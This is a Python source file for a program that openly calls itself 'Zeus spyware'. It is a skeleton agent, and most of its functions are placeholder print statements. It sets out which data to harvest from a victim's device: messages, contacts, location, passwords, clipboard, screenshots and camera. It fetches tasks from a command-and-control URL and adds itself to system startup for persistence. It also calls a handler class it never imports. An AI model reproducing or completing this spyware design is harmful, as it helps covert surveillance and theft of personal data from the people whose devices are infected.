#!/usr/local/bin/python


# Compile with Python 3 only

# Core imports
import os
import os.path
import platform
import urllib.request

from threading import Thread

# My imports
from Handlers import BootPersistanceHandler
from Handlers import TaskManagmentHandler

configurations = {}

def checkIfExists():
    print("[i] Zeus spyware is already installed.")
    return False

def launchFromStartup():
    print("[i] Zeus spyware launched from startup.")

def loadConfigurations():
    # Download configurations from Command & Control server
    socialConfigurations = {"addressbook": 1, "chat": 1, "messages": 1, "position": 1, "photo": 1, "file": 1,
                                "device": 1}
    configurations = {"social": socialConfigurations, "position": 1, "clipboard": 1, "password": 1, "screenshot": 1,
                          "camera": 1, "url": 1, "deviceInfo": 1}

    #
    # Device Info:
    # -------------
    # installed operating system version;
    # CPU architecture (32 or 64 bit);
    # RAM (used and installed);
    # installed applications;
    # info about the user logged in;
    # info about local date/hours.
    #

    # On error loading configurations, return false
    return True

def initialize():
    print("Init stuff goes here")

def startAndListen():
    print("Main programm & code goes here")

    startServices()

def authenticateDeviceID():
    print("Authenticate device ID with server")

def startServices():
    print("Start services in seperate threads according to configurations")

def sendGetConfigurationsRequest():
    jsonResponse = urllib.request.urlopen(
            "http://192.168.0.102/control.php?task=getConfigurations&agent=zeus").read()

def takeScreenshot():
    dataImagePrefix = "data:image/png;base64,"
    base64Image = ""

if __name__ == "__main__":
    print("Starting Zeus...")

    # Check if agents exists on device, if not - immidiatly copy itself to system boot/run
    isZeusExists = checkIfExists()
    if not isZeusExists:
        bootHandler = SystemBootHandler()
        bootHandler.addSelfToSystemToBoot()

    didLoadConfSuccfully = loadConfigurations()
    if didLoadConfSuccfully:
        initialize()
        startAndListen()
